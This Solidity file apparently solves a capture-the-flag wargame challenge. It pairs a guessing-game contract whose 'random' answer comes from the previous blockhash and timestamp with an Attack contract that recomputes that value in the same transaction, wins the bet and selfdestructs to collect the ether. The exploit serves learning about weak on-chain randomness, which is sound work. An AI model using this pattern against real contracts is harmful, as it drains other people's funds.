pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    uint256 timestamp;
    uint256 blockNumber = block.number;
    uint8 answer;

    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 100 wei);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function whenallThisHappening()
        public
        view
        returns (
            uint8,
            uint256,
            uint256
        )
    {
        return (answer, timestamp, blockNumber);
    }

    function guess(uint8 n) public payable returns (uint8) {
        require(msg.value == 100 wei);
        answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        blockNumber = block.number;
        timestamp = now;

        if (n == answer) {
            msg.sender.transfer(200 wei);
        }
    }
}

contract Attack {
    GuessTheNewNumberChallenge externalContract;

    constructor() {
        externalContract = GuessTheNewNumberChallenge(
            0x9373E910fCA504eE81e259b04a63B616880503e0
        );
    }

    function() payable {}

    function attack() public payable {
        require(msg.value == 100 wei);
        address me = address(msg.sender);

        externalContract.guess.value(msg.value)(
            uint8(keccak256(block.blockhash(block.number - 1), now))
        );
        selfdestruct(me);
    }
}
